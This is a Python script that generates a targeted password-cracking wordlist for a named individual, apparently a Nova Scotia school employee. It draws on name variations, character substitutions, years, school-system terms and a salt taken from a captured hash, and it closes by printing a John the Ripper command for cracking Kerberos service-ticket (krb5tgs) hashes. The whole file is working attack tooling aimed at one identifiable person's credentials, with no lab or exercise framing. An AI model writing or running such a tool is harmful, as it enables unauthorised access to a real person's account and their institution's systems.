#!/usr/bin/env python3
"""
Generate a targeted wordlist for jean-marc.samson
This creates variations based on the username, common patterns,
and domain-specific information.
"""

import os
import argparse
import itertools
import datetime

def generate_name_variations(username):
    """Generate variations based on the username"""
    variations = []
    
    # Parse the username
    if '-' in username:
        parts = username.split('-')
        first_name = parts[0]
        last_name = parts[1]
    elif '.' in username:
        parts = username.split('.')
        first_name = parts[0]
        last_name = parts[1]
    else:
        first_name = username
        last_name = ""
    
    # Basic name variations
    variations.extend([
        first_name,
        last_name,
        first_name + last_name,
        last_name + first_name,
        first_name[0] + last_name,
        first_name + last_name[0],
        first_name[0] + "." + last_name,
        first_name + "." + last_name,
        first_name + "-" + last_name,
    ])
    
    # Capitalize variations
    variations.extend([
        v.capitalize() for v in variations
    ])
    variations.extend([
        v.upper() for v in variations
    ])
    variations.extend([
        v.lower() for v in variations
    ])
    
    # Add common prefixes/suffixes
    common_additions = ["123", "1234", "12345", "2023", "2024", "2025", "!", "@", "#", "$"]
    with_additions = []
    for v in variations:
        for a in common_additions:
            with_additions.append(v + a)
    variations.extend(with_additions)
    
    # Add common substitutions
    substitutions = []
    for v in variations:
        if 'a' in v:
            substitutions.append(v.replace('a', '@'))
        if 'e' in v:
            substitutions.append(v.replace('e', '3'))
        if 'i' in v:
            substitutions.append(v.replace('i', '1'))
        if 'o' in v:
            substitutions.append(v.replace('o', '0'))
        if 's' in v:
            substitutions.append(v.replace('s', '$'))
    variations.extend(substitutions)
    
    # Add some common password patterns
    common_passwords = [
        "password", "Password", "Pass123", "P@ssw0rd",
        "welcome", "Welcome", "Welcome1", "Welcome123",
        "qwerty", "123456", "abc123", "letmein",
        "admin", "administrator", "root"
    ]
    variations.extend(common_passwords)
    
    # Add education-specific terms (given context seems to be educational)
    education_terms = [
        "teacher", "school", "classroom", "student", "class",
        "powerschool", "sishrsb", "ednet", "edu", "ns",
        "Teacher", "School", "PowerSchool", "Ednet"
    ]
    variations.extend(education_terms)
    
    # Add combinations of name + education terms
    for name in [first_name, last_name]:
        for term in education_terms:
            variations.append(name + term)
            variations.append(term + name)
    
    # Add some dates (especially if this person has been a teacher for a while)
    current_year = datetime.datetime.now().year
    years = list(range(current_year-10, current_year+1))
    months = list(range(1, 13))
    
    for year in years:
        variations.append(first_name + str(year))
        variations.append(last_name + str(year))
        variations.append(str(year) + first_name)
        variations.append(str(year) + last_name)
        variations.append(first_name[0] + last_name + str(year))
        
        # Add some month/year combinations
        for month in months:
            variations.append(f"{month}{year}")
            variations.append(f"{month:02d}{year}")
            variations.append(f"{first_name}{month:02d}{year}")
            variations.append(f"{last_name}{month:02d}{year}")
    
    # Remove duplicates and very short passwords (less than 3 chars)
    variations = list(set(variations))
    variations = [v for v in variations if len(v) >= 3]
    
    return variations

def generate_domain_specific(domain_info):
    """Generate variations based on domain-specific information"""
    variations = []
    
    # Parse domain information from the salt
    # Salt format: SVH-0236-S-17jean-marc.samson
    if domain_info.startswith("SVH"):
        variations.extend([
            "SVH", "svh", "Svh",
            "SVH123", "SVH2023", "SVH2024", "SVH2025",
            "svh123", "svh2023", "svh2024", "svh2025"
        ])
        
        # Add variations with the number in the salt (0236)
        if "-" in domain_info:
            parts = domain_info.split("-")
            if len(parts) > 1:
                num = parts[1]
                variations.extend([
                    f"SVH{num}", f"svh{num}", f"Svh{num}",
                    f"SVH-{num}", f"svh-{num}", f"Svh-{num}"
                ])
    
    # Add Nova Scotia (NS) education-related terms
    ns_terms = [
        "NovaScotia", "NS", "ns", "NSEdu", "NSTeacher",
        "NovaScotiaEdu", "NSSchool", "ednet", "Ednet"
    ]
    variations.extend(ns_terms)
    
    return variations

def main():
    parser = argparse.ArgumentParser(description="Generate a targeted wordlist for jean-marc.samson")
    parser.add_argument("--output", "-o", default="/workspaces/JaiziahGreene/targeted_wordlist.txt",
                        help="Path to output wordlist file")
    parser.add_argument("--append", "-a", action="store_true", 
                        help="Append to existing wordlist instead of creating a new one")
    args = parser.parse_args()
    
    # User information from the hash data
    username = "jean-marc.samson"
    domain_info = "SVH-0236-S-17jean-marc.samson"  # Salt from the hash
    
    # Generate variations
    print(f"[*] Generating variations for user: {username}")
    name_variations = generate_name_variations(username)
    print(f"[+] Generated {len(name_variations)} name-based variations")
    
    domain_variations = generate_domain_specific(domain_info)
    print(f"[+] Generated {len(domain_variations)} domain-specific variations")
    
    # Combine all variations
    all_variations = name_variations + domain_variations
    all_variations = list(set(all_variations))  # Remove duplicates
    
    # Write to file
    mode = 'a' if args.append else 'w'
    with open(args.output, mode) as f:
        for variation in all_variations:
            f.write(f"{variation}\n")
    
    print(f"[+] Written {len(all_variations)} unique password candidates to {args.output}")
    print(f"[*] Use this file with John: john --format=krb5tgs --wordlist={args.output} /path/to/hash/file")

if __name__ == "__main__":
    main()
